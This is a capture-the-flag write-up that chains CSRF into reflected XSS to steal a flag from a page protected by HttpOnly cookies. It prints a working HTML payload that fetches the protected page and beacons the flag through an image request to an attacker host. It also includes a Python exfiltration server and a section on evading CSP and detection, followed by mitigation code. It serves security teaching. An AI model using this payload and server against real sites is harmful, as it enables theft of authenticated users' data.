# CSRF → XSS → Flag Exfiltration Challenge Writeup

## Challenge Description

This challenge builds upon previous CSRF and XSS vulnerabilities but introduces HttpOnly cookies, preventing traditional cookie theft. The goal is to leverage XSS execution within the target origin to directly extract and exfiltrate the flag from protected pages.

## Vulnerability Analysis

### Key Security Features
1. **HttpOnly Cookies**: Session cookies inaccessible to JavaScript
2. **Same-Origin Policy**: Normally prevents cross-origin data access
3. **Reflected XSS**: Unsanitized user input in `/ephemeral` endpoint

### Attack Surface
- CSRF to deliver XSS payload
- XSS execution within target origin
- Same-origin fetch() to access protected content
- Regex-based flag extraction
- Image-based exfiltration channel

## Solution Architecture

### 1. Malicious HTML (`index.html`)

```html
<!DOCTYPE html>
<html>
<body>
<script>
const payload = `
<script>
fetch('/')
  .then(r => r.text())
  .then(data => {
    const flagMatch = data.match(/pwn\.college\{[^}]+\}/);
    if (flagMatch) {
      new Image().src='http://hacker.localhost:1337/steal?flag='+encodeURIComponent(flagMatch[0]);
    }
  });
<\/script>
`;

window.location = "http://challenge.localhost/ephemeral?msg=" + encodeURIComponent(payload);
</script>
</body>
</html>
```

**Technical Components:**
- Multi-stage payload delivery
- Template literals for clean JavaScript embedding
- DOM-based flag pattern matching
- Image object for stealthy exfiltration
- URL encoding for reliable transmission

### 2. Exfiltration Server (`server.py`)

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, unquote
import os

class RequestHandler(BaseHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        pass  # Disable default logging

    def do_GET(self):
        if self.path.startswith('/steal'):
            # Parse and log stolen flag
            query = self.path.split('?', 1)[1] if '?' in self.path else ''
            params = parse_qs(query)
            
            if 'flag' in params:
                flag = unquote(params['flag'][0])
                print(f"\n[!] FLAG EXFILTRATED: {flag}\n")
                with open('flags.txt', 'a') as f:
                    f.write(f"{flag}\n")
            
            self.send_response(200)
            self.end_headers()
            return
        
        # Serve malicious HTML
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        with open('index.html', 'rb') as f:
            self.wfile.write(f.read())

if __name__ == '__main__':
    print("[+] Starting malicious server on port 1337")
    HTTPServer(('0.0.0.0', 1337), RequestHandler).serve_forever()
```

**Server Features:**
- Silent operation mode
- Robust parameter parsing
- Dual output (console + file)
- Proper content-type handling
- Error-resistant design

## Attack Execution Flow

1. **Victim Initialization**
   - Admin authenticates to challenge.localhost
   - HttpOnly session cookie established

2. **CSRF Delivery**
   - Admin visits hacker.localhost:1337
   - Malicious script forces navigation to vulnerable endpoint

3. **XSS Execution**
   - Payload reflected into ephemeral message page
   - JavaScript executes in challenge.localhost origin

4. **Flag Extraction**
   - fetch() retrieves protected content
   - Regex matches flag pattern
   - Image request exfiltrates data

5. **Data Collection**
   - Attacker server logs captured flag
   - Flag written to persistent storage

## Defense Bypass Techniques

1. **HttpOnly Workaround**
   - Direct content access instead of cookie theft
   - Leverages same-origin XSS privileges

2. **CSP Evasion**
   - Uses img.src instead of fetch() for exfiltration
   - Masquerades as resource loading

3. **Detection Avoidance**
   - Minimal server logging
   - Standard-looking HTTP traffic
   - Small payload footprint

## Mitigation Strategies

### For Developers
1. **Input Validation**
   ```python
   from flask import escape
   @app.route('/ephemeral')
   def ephemeral():
       return f"<div>{escape(request.args.get('msg', ''))}</div>"
   ```

2. **Content Security Policy**
   ```http
   Content-Security-Policy: default-src 'self'; img-src 'self'
   ```

3. **CSRF Protections**
   ```python
   from flask_wtf.csrf import CSRFProtect
   CSRFProtect(app)
   ```

### For System Administrators
1. **HttpOnly + Secure Cookies**
   ```python
   app.config.update(
       SESSION_COOKIE_HTTPONLY=True,
       SESSION_COOKIE_SECURE=True
   )
   ```

2. **XSS Filtering**
   ```nginx
   add_header X-XSS-Protection "1; mode=block";
   ```

3. **Monitoring**
   - Alert on unexpected outbound connections
   - Flag pattern detection in logs

## Key Takeaways

1. **Vulnerability Chaining**
   - CSRF enables XSS delivery
   - XSS bypasses same-origin policy
   - Combined attack > sum of parts

2. **Alternative Exfiltration**
   - When cookies are protected, target content directly
   - Multiple exfiltration channels available

3. **Defense in Depth**
   - Single protections easily bypassed
   - Layered security required
   - Monitor both inputs and outputs

This solution demonstrates how modern web attacks require understanding multiple vulnerability classes and their interactions. The complete attack path from initial compromise to flag exfiltration highlights the importance of comprehensive security measures.